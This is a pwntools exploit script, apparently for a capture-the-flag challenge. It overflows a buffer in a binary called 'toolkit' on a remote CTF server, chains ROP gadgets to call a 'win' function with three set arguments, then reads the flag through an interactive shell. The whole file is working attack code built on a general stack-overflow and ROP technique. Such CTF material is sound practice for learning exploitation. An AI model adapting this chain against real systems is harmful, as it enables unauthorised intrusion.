from pwn import *

context.binary = elf = ELF('./toolkit', checksec=False)
context.arch = 'amd64'
#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13524)

OFFSET_TO_RIP = 72

# addresses found using nm ./toolkit | grep -E "pop_rdi|pop_rsi|pop_rdx|ret_gadget|win"
# pop_rdi = 0x00000000004011fb
# pop_rsi = 0x0000000000401204
# pop_rdx = 0x000000000040120d
# ret_gadget = 0x0000000000401216
# win = 0x000000000040121e

a = 0x1111111111111111
b = 0x2222222222222222
c = 0x3333333333333333

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
ret_gadget = elf.sym.ret_gadget
win_addr = elf.sym.win

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi),
    p64(a),
    p64(pop_rsi),
    p64(b),
    p64(pop_rdx),
    p64(c),
    p64(win_addr),
)

p.recvuntil(b'Input:')
p.send(payload)

sleep(0.5)
p.sendline(b'cat flag')
p.interactive()
